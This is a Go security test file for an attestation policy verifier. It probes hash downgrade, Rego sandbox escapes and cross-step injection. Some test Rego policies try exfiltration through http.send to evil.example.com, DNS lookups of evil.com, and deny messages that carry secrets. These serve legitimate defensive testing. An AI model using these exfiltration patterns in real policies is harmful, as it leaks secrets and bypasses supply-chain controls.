							products: map[string]attestation.Product{
								"build-output.tar": {
									MimeType: "application/octet-stream",
									Digest: cryptoutil.DigestSet{
										sha1Key: "sha1_matches_mats",
										// SHA256 intentionally omitted by attacker
									},
								},
							},
						},
					}},
				},
			},
		}

		consumerStep := Step{
			Name:          "consumer",
			ArtifactsFrom: []string{"producer"},
		}

		consumerCVR := source.CollectionVerificationResult{
			CollectionEnvelope: source.CollectionEnvelope{
				Collection: attestation.Collection{
					Name: "consumer",
					Attestations: []attestation.CollectionAttestation{{
						Type: "https://example.com/consumer/v1",
						Attestation: &materialProductAttestor{
							typeName: "https://example.com/consumer/v1",
							materials: map[string]cryptoutil.DigestSet{
								"build-output.tar": {
									sha256Key: "sha256_value",
									sha1Key:   "sha1_matches_mats",
								},
							},
						},
					}},
				},
			},
		}

		collectionsByStep := map[string]StepResult{
			"producer": {
				Step:   "producer",
				Passed: []PassedCollection{{Collection: producerCVR}},
			},
		}

		err := verifyCollectionArtifacts(consumerStep, consumerCVR, collectionsByStep)
		assert.NoError(t, err,
			"SECURITY FINDING: Full artifact flow confirms hash downgrade. "+
				"Producer omits SHA256 from products, consumer has SHA256+SHA1 in materials. "+
				"Comparison only checks SHA1 (the common hash) and passes.")
	})
}

// ---------------------------------------------------------------------------
// R3-210-6: Rego policy sandbox evaluation
//
// Tests for Rego sandbox escape and injection vectors.
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_RegoSandboxEvaluation(t *testing.T) {
	t.Run("blocked_http_send", func(t *testing.T) {
		policy := RegoPolicy{
			Name: "exfil.rego",
			Module: []byte(`package exfil
deny[msg] {
  resp := http.send({"method": "GET", "url": "http://evil.example.com"})
  msg := "exfiltrated"
}`),
		}
		err := EvaluateRegoPolicy(&marshalableAttestor{AttName: "test", AttType: "test"}, []RegoPolicy{policy})
		require.Error(t, err, "http.send must be blocked")
	})

	t.Run("blocked_net_lookup", func(t *testing.T) {
		policy := RegoPolicy{
			Name: "dns.rego",
			Module: []byte(`package dns
deny[msg] {
  addrs := net.lookup_ip_addr("evil.com")
  msg := "dns exfil"
}`),
		}
		err := EvaluateRegoPolicy(&marshalableAttestor{AttName: "test", AttType: "test"}, []RegoPolicy{policy})
		require.Error(t, err, "net.lookup_ip_addr must be blocked")
	})

	t.Run("blocked_opa_runtime", func(t *testing.T) {
		policy := RegoPolicy{
			Name: "runtime.rego",
			Module: []byte(`package runtime
deny[msg] {
  rt := opa.runtime()
  msg := "leaked runtime"
}`),
		}
		err := EvaluateRegoPolicy(&marshalableAttestor{AttName: "test", AttType: "test"}, []RegoPolicy{policy})
		require.Error(t, err, "opa.runtime must be blocked")
	})

	t.Run("missing_deny_rule_caught", func(t *testing.T) {
		// A policy module that defines NO deny rule at all. Without the
		// len(rs)==0 check, this would silently pass.
		policy := RegoPolicy{
			Name: "nodeny.rego",
			Module: []byte(`package nodeny
allow { true }
`),
		}
		err := EvaluateRegoPolicy(&marshalableAttestor{AttName: "test", AttType: "test"}, []RegoPolicy{policy})
		require.Error(t, err, "policy without deny rule must be caught")
		assert.Contains(t, err.Error(), "no results",
			"error should indicate missing deny rule")
	})

	t.Run("data_exfiltration_via_deny_message", func(t *testing.T) {
		// Rego policy extracts a "secret" field from the attestor data
		// and embeds it in the deny message.
		attestor := &marshalableAttestorArbitrary{
			typeName: "secret-type",
			data: map[string]interface{}{
				"name":       "harmless",
				"type":       "secret-type",
				"api_secret": "AKIA_TOP_SECRET_KEY",
			},
		}

		policy := RegoPolicy{
			Name: "exfil_deny.rego",
			Module: []byte(`package exfil_deny
deny[msg] {
  key := input.api_secret
  msg := sprintf("EXFIL:%s", [key])
}`),
		}

		err := EvaluateRegoPolicy(attestor, []RegoPolicy{policy})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "AKIA_TOP_SECRET_KEY",
			"SECURITY FINDING: Rego can exfiltrate attestation data via deny messages. "+
				"The secret key appeared in the error output. Attestation data is fully "+
				"accessible to Rego policies and can be leaked through error strings.")
	})

	t.Run("cross_step_context_injection_via_attestor_steps_field", func(t *testing.T) {
		// When stepContext is nil (backward compat), the attestor IS the input.
		// An attestor that has a "steps" field can inject fake cross-step data.
		malicious := &marshalableAttestorArbitrary{
			typeName: "https://example.com/deploy/v1",
			data: map[string]interface{}{
				"name": "deploy",
				"type": "https://example.com/deploy/v1",
				"steps": map[string]interface{}{
					"build": map[string]interface{}{
						"https://example.com/build/v1": map[string]interface{}{
							"approved": true,
						},
					},
				},
			},
		}

		// Rego policy checks cross-step build data.
		policy := RegoPolicy{
			Name: "cross_check.rego",
			Module: []byte(`package cross_check
deny[msg] {
  build := input.steps.build["https://example.com/build/v1"]
  build.approved != true
  msg := "build not approved"
}`),
		}

		// With nil stepContext, input = attestor JSON, so input.steps is attacker-controlled.
		err := EvaluateRegoPolicy(malicious, []RegoPolicy{policy})
		assert.NoError(t, err,
			"SECURITY FINDING: With nil stepContext (backward-compat path), "+
				"an attestor with a 'steps' field injects fake cross-step context. "+
				"The Rego policy reads attacker-controlled input.steps and is satisfied. "+
				"Mitigation: Verify() now ensures non-nil stepCtx for steps with AttestationsFrom.")
	})
}

// ---------------------------------------------------------------------------
// R3-210 additional: topologicalSort non-determinism can cause different
// cross-step context when combined with last-writer-wins.
//
// If steps B and C are independent but both produce attestation type T
// for step D, the order they appear in the topological sort determines
// which one's data ends up in D's cross-step context.
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_NonDeterministicSortAffectsContext(t *testing.T) {
	// Directly test buildStepContext with overlapping attestation types
	// from two dependency steps.
	attType := "https://example.com/scan/v1"

	results := map[string]StepResult{
		"scanner-a": {
			Step: "scanner-a",
			Passed: []PassedCollection{{
				Collection: source.CollectionVerificationResult{
					CollectionEnvelope: source.CollectionEnvelope{
						Collection: attestation.Collection{
							Name: "scanner-a",
							Attestations: []attestation.CollectionAttestation{{
								Type:        attType,
								Attestation: &marshalableAttestor{AttName: "from-scanner-a", AttType: attType},
							}},
						},
					},
				},
			}},
		},
		"scanner-b": {
			Step: "scanner-b",
			Passed: []PassedCollection{{
				Collection: source.CollectionVerificationResult{
					CollectionEnvelope: source.CollectionEnvelope{
						Collection: attestation.Collection{
							Name: "scanner-b",
							Attestations: []attestation.CollectionAttestation{{
								Type:        attType,
								Attestation: &marshalableAttestor{AttName: "from-scanner-b", AttType: attType},
							}},
						},
					},
				},
			}},
		},
	}

	ctx := buildStepContext([]string{"scanner-a", "scanner-b"}, results)
	require.NotNil(t, ctx)

	// Each dep step gets its own key in the context map.
	// scanner-a and scanner-b are separate keys, so there's no collision
	// between DIFFERENT steps. The last-writer-wins issue is WITHIN a single
	// step's multiple passed collections.
	_, hasA := ctx["scanner-a"]
	_, hasB := ctx["scanner-b"]
	assert.True(t, hasA, "scanner-a should be in context")
	assert.True(t, hasB, "scanner-b should be in context")

	// But within each step, if there were multiple passed collections with
	// the same att type, last-writer wins. This is tested in R3-210-1.
	t.Log("Cross-step context uses dep step NAME as the key, so different steps " +
		"don't collide. The last-writer-wins issue is only within a single step's " +
		"multiple passed collections (see R3-210-1).")
}

// ===========================================================================
// Test helpers for R3-210 security tests
// ===========================================================================

// marshalableAttestorWithExtra is like marshalableAttestor but with an
// additional field for shadow attack testing.
type marshalableAttestorWithExtra struct {
	AttName     string `json:"name"`
	AttType     string `json:"type"`
	BuildStatus string `json:"build_status"`
}

func (m *marshalableAttestorWithExtra) Name() string                                  { return m.AttName }
func (m *marshalableAttestorWithExtra) Type() string                                  { return m.AttType }
func (m *marshalableAttestorWithExtra) RunType() attestation.RunType                  { return "test" }
func (m *marshalableAttestorWithExtra) Attest(_ *attestation.AttestationContext) error { return nil }
func (m *marshalableAttestorWithExtra) Schema() *jsonschema.Schema                    { return nil }

// marshalableAttestorArbitrary wraps arbitrary data to implement attestation.Attestor.
type marshalableAttestorArbitrary struct {
	typeName string
	data     map[string]interface{}
}

func (m *marshalableAttestorArbitrary) Name() string                                  { return "arbitrary" }
func (m *marshalableAttestorArbitrary) Type() string                                  { return m.typeName }
func (m *marshalableAttestorArbitrary) RunType() attestation.RunType                  { return "test" }
func (m *marshalableAttestorArbitrary) Attest(_ *attestation.AttestationContext) error { return nil }
func (m *marshalableAttestorArbitrary) Schema() *jsonschema.Schema                    { return nil }
func (m *marshalableAttestorArbitrary) MarshalJSON() ([]byte, error) {
	return json.Marshal(m.data)
}

// materialProductAttestor implements Materialer and Producer for artifact tests.
type materialProductAttestor struct {
	typeName  string
	materials map[string]cryptoutil.DigestSet
	products  map[string]attestation.Product
}

func (m *materialProductAttestor) Name() string                                  { return "mat-prod" }
func (m *materialProductAttestor) Type() string                                  { return m.typeName }
func (m *materialProductAttestor) RunType() attestation.RunType                  { return "test" }
func (m *materialProductAttestor) Attest(_ *attestation.AttestationContext) error { return nil }
func (m *materialProductAttestor) Schema() *jsonschema.Schema                    { return nil }
func (m *materialProductAttestor) Materials() map[string]cryptoutil.DigestSet     { return m.materials }
func (m *materialProductAttestor) Products() map[string]attestation.Product       { return m.products }

// contains checks if s contains substr. Avoids importing strings in test.
func contains(s, substr string) bool {
	return len(s) >= len(substr) && searchString(s, substr)
}

func searchString(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// ===========================================================================
// End R3-210 security tests
// ===========================================================================

// TestCrossStep_Verify_DepFailsWithRegoPolicy_SecurityFix is the end-to-end test
// verifying that the silent-pass security issue is fixed. When a step has
// AttestationsFrom and a Rego policy checking cross-step data, and the dependency
// step fails verification, the Rego policy should properly DENY (not silently pass).
func TestCrossStep_Verify_DepFailsWithRegoPolicy_SecurityFix(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	buildAttType := "https://example.com/build/v1"
	deployAttType := "https://example.com/deploy/v1"

	// Rego policy that REQUIRES build step data to be present
	regoModule := []byte(`
package security_fix

deny[msg] {
	not input.steps.build
	msg := "build step attestation data is required but missing"
}
`)

	steps := map[string]Step{
		"build": {
			Name:          "build",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			// build expects a type that won't be present -> build FAILS
			Attestations: []Attestation{{Type: "https://example.com/will-be-missing"}},
		},
		"deploy": {
			Name:             "deploy",
			AttestationsFrom: []string{"build"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations: []Attestation{{
				Type:         deployAttType,
				RegoPolicies: []RegoPolicy{{Module: regoModule, Name: "security_fix.rego"}},
			}},
		},
	}

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"build": {makeCVR("build", verifier, attestation.CollectionAttestation{
				Type: buildAttType, Attestation: &marshalableAttestor{AttName: "build", AttType: buildAttType},
			})},
			"deploy": {makeCVR("deploy", verifier, attestation.CollectionAttestation{
				Type: deployAttType, Attestation: &marshalableAttestor{AttName: "deploy", AttType: deployAttType},
			})},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)

	// Overall should fail
	assert.False(t, pass, "should fail because build fails AND deploy's rego detects missing build data")

	// Build should fail (missing attestation type)
	assert.False(t, results["build"].Analyze(), "build should fail")

	// Deploy should ALSO fail: its rego policy checks input.steps.build which
	// is absent because build didn't pass. Before the fix, deploy would
	// silently pass because nil stepCtx triggered backward-compat path.
	assert.False(t, results["deploy"].Analyze(),
		"deploy should fail: rego policy must detect missing build step data (security fix)")
}
